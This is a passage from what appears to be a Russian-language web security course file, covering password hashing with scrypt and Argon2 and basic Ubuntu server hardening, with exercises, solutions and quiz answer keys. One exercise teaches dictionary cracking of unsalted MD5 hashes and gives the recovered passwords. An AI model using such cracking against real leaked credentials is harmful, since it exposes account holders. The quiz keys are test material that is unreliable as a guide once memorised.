    save_new_hash(new_hash)`,
    },
    {
      title: 'scrypt из стандартной библиотеки',
      lang: 'python',
      code: String.raw`
import hashlib
import hmac
import os

def hash_password(password: str) -> str:
    salt = os.urandom(16)
    h = hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1)
    return salt.hex() + ":" + h.hex()

def verify_password(password: str, stored: str) -> bool:
    salt_hex, hash_hex = stored.split(":")
    h = hashlib.scrypt(password.encode(), salt=bytes.fromhex(salt_hex), n=2**14, r=8, p=1)
    return hmac.compare_digest(h.hex(), hash_hex)     # сравнение за постоянное время`,
    },
  ],
  tasks: [
    {
      title: 'Взломайте MD5',
      level: 'легко',
      text: `<p>Дан список «утёкших» хешей MD5 без соли: <code>5f4dcc3b5aa765d61d8327deb882cf99</code>, <code>25d55ad283aa400af464c76d713c07ad</code>, <code>d8578edf8458ce06fbc5bb76a58c5ca4</code>.
        Восстановите пароли перебором по словарю из 1000 популярных паролей (поищите список «top 1000 passwords»). Сколько времени это заняло? Какой вывод?</p>`,
      solution: `<p>Это <code>password</code>, <code>12345678</code> и <code>qwerty</code> — находятся за доли секунды. Быстрый хеш без соли не защищает популярные пароли вообще.</p>`,
    },
    {
      title: 'Подберите параметры',
      level: 'средне',
      text: `<p>Замерьте время хеширования bcrypt с cost 10, 12, 14 и Argon2id с разными <code>time_cost</code> и <code>memory_cost</code> на вашем компьютере. Подберите параметры, дающие ~250 мс.
        Посчитайте: сколько лет займёт перебор 10<sup>12</sup> вариантов на одном ядре при таких параметрах?</p>`,
    },
    {
      title: 'Миграция со старых хешей',
      level: 'сложно',
      text: `<p>В унаследованной базе пароли хранятся как <code>sha256(password)</code>. Перевести всех на Argon2 нужно сейчас, не дожидаясь, пока каждый войдёт. Как это сделать?</p>`,
      solution: `<p>Обернуть старые хеши: сохранить <code>argon2(sha256_hex)</code> для всех пользователей сразу, пометив тип хеша. При проверке для таких записей считать <code>argon2.verify(sha256(password))</code>.
        При следующем успешном входе пересчитать в чистый <code>argon2(password)</code>. Так слабые хеши исчезают из базы немедленно.</p>`,
    },
  ],
  quiz: [
    { q: 'Почему SHA-256 плох для хранения паролей?', options: ['Он сломан', 'Он слишком быстрый — легко перебирать', 'Он обратимый', 'Он длинный'], answer: 1 },
    { q: 'Зачем нужна соль?', options: ['Ускорить хеширование', 'Чтобы одинаковые пароли давали разные хеши и не работали радужные таблицы', 'Для шифрования', 'Чтобы хеш был короче'], answer: 1 },
    { q: 'Какой алгоритм OWASP рекомендует для паролей в первую очередь?', options: ['MD5', 'SHA-1', 'Argon2id', 'Base64'], answer: 2 },
    { q: 'Где хранится соль при использовании bcrypt/argon2?', options: ['В отдельной секретной таблице', 'Внутри строки хеша, рядом с параметрами', 'В переменной окружения', 'Нигде'], answer: 1 },
  ],
  resources: [
    { title: 'OWASP Password Storage Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html' },
    { title: 'pwdlib', url: 'https://frankie567.github.io/pwdlib/' },
  ],
});

registerContent('server-security', {
  intro: `<p>Даже идеальный код не спасёт, если сервер открыт всему интернету с паролем <code>root:123456</code>. Сразу после появления публичного IP сервер начинают сканировать боты —
    в логах SSH через час будут тысячи попыток входа. Базовая защита сервера занимает полчаса и обязательна.</p>`,
  theory: [
    {
      title: 'SSH',
      html: `<ul>
          <li>Вход <b>только по ключам</b>: <code>PasswordAuthentication no</code>.</li>
          <li>Запрет входа под root: <code>PermitRootLogin no</code> — работаем под обычным пользователем с <code>sudo</code>.</li>
          <li><b>fail2ban</b> блокирует IP после нескольких неудачных попыток.</li>
          <li>Доступ к SSH только из доверенных сетей или через VPN / бастион-хост, если возможно.</li>
        </ul>`,
    },
    {
      title: 'Сеть и файрвол',
      html: `<p>Принцип: <b>закрыто всё, кроме необходимого</b>. Публичному веб-серверу нужны 22 (SSH), 80 и 443. База данных, Redis, внутренние API <b>никогда</b> не должны слушать публичный интерфейс.</p>
        <ul>
          <li><code>ufw</code> (Ubuntu) или облачные security groups;</li>
          <li>сервисы слушают <code>127.0.0.1</code> или приватную сеть, а не <code>0.0.0.0</code>;</li>
          <li>проверка снаружи: <code>nmap ваш_ip</code> — открыты ли лишние порты.</li>
        </ul>
        <p class="note">Docker пробрасывает порты в обход ufw! <code>-p 5432:5432</code> открывает PostgreSQL всему миру. Используйте <code>-p 127.0.0.1:5432:5432</code> или вообще не пробрасывайте порты внутренних сервисов.</p>`,
    },
    {
      title: 'Минимальные привилегии и обновления',
      html: `<ul>
          <li>Приложение запускается под отдельным пользователем без прав root и без доступа к чужим файлам.</li>
          <li>У приложения своя роль в БД только с нужными правами.</li>
          <li>Автоматические обновления безопасности ОС (<code>unattended-upgrades</code>).</li>
          <li>Секреты — в переменных окружения или менеджере секретов (Vault, облачные Secret Manager), не в Git и не в образе Docker.</li>
          <li>Удалите неиспользуемые сервисы и пакеты — меньше поверхность атаки.</li>
        </ul>`,
    },
    {
      title: 'Наблюдение и восстановление',
      html: `<ul>
          <li>Логи входов и действий (<code>/var/log/auth.log</code>, journald) с отправкой во внешнюю систему — взломщик первым делом чистит локальные логи.</li>
          <li>Мониторинг и алерты на подозрительную активность.</li>
          <li>Бэкапы, хранящиеся отдельно от сервера.</li>
          <li><b>Неизменяемая инфраструктура</b>: сервер не «чинят» вручную, а пересоздают из кода (Docker, Terraform, Ansible) — заодно убирается всё, что мог оставить злоумышленник.</li>
        </ul>`,
    },
  ],
  examples: [
    {
      title: 'Базовая настройка Ubuntu-сервера',
      lang: 'bash',
      code: String.raw`
# 1. Пользователь для работы
adduser deploy
usermod -aG sudo deploy

# 2. SSH-ключ (выполнить на СВОЁМ компьютере)
ssh-copy-id deploy@203.0.113.10

# 3. Запрет паролей и root (на сервере), проверив вход по ключу в другом окне!
sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication no/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart ssh

# 4. Файрвол
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow OpenSSH
sudo ufw allow 80,443/tcp
sudo ufw enable
sudo ufw status verbose

# 5. Защита от перебора и автообновления
sudo apt install -y fail2ban unattended-upgrades
sudo dpkg-reconfigure -plow unattended-upgrades`,
      explain: `<p>Не закрывайте текущую SSH-сессию, пока не проверите вход по ключу в новом окне, — иначе можно потерять доступ к серверу.</p>`,
    },
    {
      title: 'Приложение как systemd-сервис без root',
      lang: 'ini',
      code: String.raw`
# /etc/systemd/system/notes.service
[Unit]
Description=Notes API
After=network.target

[Service]
User=notes
Group=notes
WorkingDirectory=/opt/notes
EnvironmentFile=/etc/notes/env          # секреты, права 600
ExecStart=/opt/notes/.venv/bin/uvicorn app.main:app --host 127.0.0.1 --port 8000
Restart=on-failure
NoNewPrivileges=true
ProtectSystem=strict
ReadWritePaths=/opt/notes/uploads
PrivateTmp=true

[Install]
WantedBy=multi-user.target`,
      explain: `<p>Приложение слушает только <code>127.0.0.1</code> — снаружи к нему обращаются через Nginx с HTTPS. Директивы <code>Protect*</code> ограничивают, что процесс может сделать даже при взломе.</p>`,
    },
  ],
  tasks: [
    {
      title: 'Защитите VPS',
      level: 'средне',
      text: `<p>Арендуйте самый дешёвый VPS (или поднимите виртуальную машину в VirtualBox / Multipass) и выполните базовую настройку из примера. Через сутки посмотрите
        <code>sudo journalctl -u ssh | grep "Failed"</code> и <code>sudo fail2ban-client status sshd</code> — сколько было попыток взлома и сколько IP заблокировано?</p>`,
    },
    {
      title: 'Проверка снаружи',
      level: 'легко',
      text: `<p>Запустите PostgreSQL в Docker с <code>-p 5432:5432</code> на сервере с включённым ufw, разрешающим только 22/80/443. Проверьте с другого компьютера <code>nmap -p 5432 IP</code>. Открыт ли порт? Исправьте.</p>`,
      solution: `<p>Порт будет открыт: Docker добавляет свои правила iptables раньше правил ufw. Исправление — <code>-p 127.0.0.1:5432:5432</code> или общение контейнеров через внутреннюю сеть Docker без проброса порта.</p>`,
    },
  ],
  quiz: [
    { q: 'Как лучше входить на сервер по SSH?', options: ['Под root по паролю', 'По ключу под обычным пользователем с sudo', 'Через Telnet', 'По паролю, но длинному'], answer: 1 },
    { q: 'Какие порты должны быть открыты у типичного веб-сервера?', options: ['Все', '22, 80, 443', '22, 80, 443, 5432, 6379', 'Только 8000'], answer: 1 },
    { q: 'Почему <code>docker run -p 5432:5432</code> опасен на публичном сервере?', options: ['Медленно', 'Docker открывает порт наружу в обход ufw', 'Postgres не работает в Docker', 'Нужно больше памяти'], answer: 1 },
    { q: 'Под каким пользователем запускать приложение?', options: ['root', 'Отдельный пользователь без лишних прав', 'Ваш личный пользователь', 'nobody с sudo'], answer: 1 },
  ],
  resources: [
    { title: 'DigitalOcean: первичная настройка Ubuntu', url: 'https://www.digitalocean.com/community/tutorials/initial-server-setup-with-ubuntu' },
    { title: 'Mozilla: рекомендации по OpenSSH', url: 'https://infosec.mozilla.org/guidelines/openssh' },
  ],
});
